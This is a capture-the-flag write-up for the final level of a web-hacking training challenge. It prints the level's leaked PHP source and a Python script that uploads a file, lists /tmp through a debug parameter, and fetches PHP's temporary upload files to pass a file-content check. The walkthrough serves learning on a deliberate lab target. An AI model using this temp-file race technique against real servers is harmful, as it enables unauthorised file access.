# Level-30

Level30(Final) (https://matrix.voorivex.academy/the-final-fight-9079c3d77eecb6699bb4a27b3cd249ec/)

Send this request:

```text
https://matrix.voorivex.academy/the-final-fight-9079c3d77eecb6699bb4a27b3cd249ec/?show-me-the-codes
```

you will get a php code:

```php
<?php
if (isset($_GET['show-me-the-codes'])) {
    show_source("index.php");
    exit();
}

if (isset($_GET["show-me-more"])) {
    print_r(scandir("/tmp/"));
    die();
}

function security_check($input)
{
    $pattern = '/^\/tmp\/[0-9a-zA-Z]+$/';
    if (preg_match($pattern, $input)) {
        return True;
    }
    return False;
}

if (security_check($_GET['code'])) {
    $file_contents = file_get_contents($_GET['code']);
    if (strpos($file_contents, 'escape_from_matrix') === 0) {
        require_once('next.php');
        die($next);
    }
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Check if there is a file selected
    if (isset($_FILES["file"])) {
        $file = $_FILES["file"];

        // File details
        $fileName = $file["name"];
        $fileType = $file["type"];
        $fileSize = $file["size"];
        $fileTmpName = $file["tmp_name"];
        $fileError = $file["error"];

        $you_are_god = False;
        if ($you_are_god === True) {

            $uploadDir = "uploads/";
            if (!file_exists($uploadDir)) {
                mkdir($uploadDir, 0755, true);
            }

            $destination = $uploadDir . $fileName;
            if (move_uploaded_file($fileTmpName, $destination)) {
                echo "File uploaded successfully.";
            } else {
                echo "Error uploading file.";
            }
        }

        die('you are not the God');
    }
}

?>
```


according to the code we need these conditions:

- parameter `code` shoud start with `/tmp/`
- content of the file must begin with `escape_from_matrix`
- we need to upload a file to server
- we should immediately send the request to `https://matrix.voorivex.academy/the-final-fight-9079c3d77eecb6699bb4a27b3cd249ec/?show-me-more`
- we should get all the array values and send another request to get /tmp/ files

the python code :

```python
import requests
import re

main_url = 'https://matrix.voorivex.academy/the-final-fight-9079c3d77eecb6699bb4a27b3cd249ec/'

myfile = open("test.txt", "rb")

test_upload = requests.post(main_url, files={'file':myfile})
if test_upload.ok:
    print('uploaded')
print(test_upload.text)


show_me_more_url = 'https://matrix.voorivex.academy/the-final-fight-9079c3d77eecb6699bb4a27b3cd249ec/?show-me-more'
respons = requests.get(show_me_more_url)
print(respons.text)

chunks = re.findall('php.*',respons.text)

print(chunks)

for i in chunks:
    l_resp = requests.get(f'{main_url}?code=/tmp/{i}')
    print(l_resp.text)
```


  

https://matrix.voorivex.academy/yOu-havE-jUst-escaped-the-Matrix!/
